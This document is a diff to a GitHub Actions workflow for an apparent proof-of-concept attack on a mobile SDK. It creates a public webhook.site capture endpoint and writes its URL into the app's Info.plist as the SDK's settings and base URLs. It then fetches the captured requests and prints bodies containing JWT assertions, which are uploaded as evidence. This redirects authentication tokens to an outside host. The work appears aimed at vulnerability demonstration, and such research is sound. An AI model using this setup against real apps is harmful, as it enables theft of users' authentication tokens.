@@ -20,16 +20,21 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Start attacker JWT listener (runner loopback)
+      - name: Create webhook.site listener (公网捕获)
         run: |
-          nohup python3 capture-jwt.py 600 > listener.log 2>&1 &
-          sleep 1
-          head -2 listener.log
+          T=$(curl -s -X POST https://webhook.site/token -H 'Content-Type: application/json' -d '{}' | python3 -c "import sys,json;print(json.load(sys.stdin)['uuid'])")
+          echo "webhook uuid: $T"
+          echo "WH=$T" >> $GITHUB_ENV
+          # 默认响应: 200 + 最小 JSON (settings fetch 能收到响应)
+          curl -s -X PUT "https://webhook.site/token/$T" -H 'Content-Type: application/json' -d '{"default_status":200,"default_content":"{\"connectivity\":{\"connected\":true},\"settings\":{}}","default_content_type":"application/json"}' > /dev/null
 
-      - name: Generate Xcode project
+      - name: Generate Xcode project + 注入 webhook URL
         run: |
           brew install xcodegen
           xcodegen generate
+          plutil -replace ZDK_SETTINGS_BASE_URL -string "https://webhook.site/$WH" PoC/Info.plist
+          plutil -replace ZDK_BASE_URL -string "https://webhook.site/$WH" PoC/Info.plist
+          plutil -print PoC/Info.plist | grep -A1 ZDK || true
 
       - name: Install SDK (tag 15.2.0, 含官方模拟器 slice)
         run: pod install
@@ -80,13 +85,28 @@ jobs:
           LATEST=$(ls -t ~/Library/Logs/DiagnosticReports/*.ips 2>/dev/null | head -1)
           if [ -n "$LATEST" ]; then cp "$LATEST" ./crash-report.ips; echo "crash copied: $LATEST"; fi
 
-      - name: Show capture result
+      - name: Show capture result + webhook.site requests
         run: |
           kill $(cat recorder.pid) 2>/dev/null || pkill -f recordVideo || true
           sleep 3
           cat listener.log || true
           echo "---- captured-jwt.json ----"
           cat captured-jwt.json || echo "(no capture)"
+          echo "---- webhook.site 收到的请求 ----"
+          curl -s "https://webhook.site/token/$WH/requests?sorting=newest&per_page=20" -o wh-requests.json || true
+          python3 -c "
+import json
+try:
+    d = json.load(open('wh-requests.json'))
+    print('总请求数:', d.get('total', 0))
+    for r in d.get('data', [])[:15]:
+        print('-', r.get('method'), r.get('path') or r.get('url', '')[:60], '| UA:', (r.get('headers') or {}).get('user-agent', {}).get('value', '')[:40] if isinstance((r.get('headers') or {}), dict) else '')
+        c = r.get('content') or ''
+        if 'assertion' in c or 'jwt' in c.lower(): print('  BODY:', c[:300])
+except Exception as e:
+    print('parse err:', e)
+" || true
+          curl -s "https://webhook.site/token/$WH/requests?sorting=newest&per_page=50" -o wh-requests-full.json || true
 
       - name: Upload evidence
         if: always()
@@ -101,3 +121,5 @@ jobs:
             record-error.log
             crash-report.ips
             app-oslog.txt
+            wh-requests.json
+            wh-requests-full.json
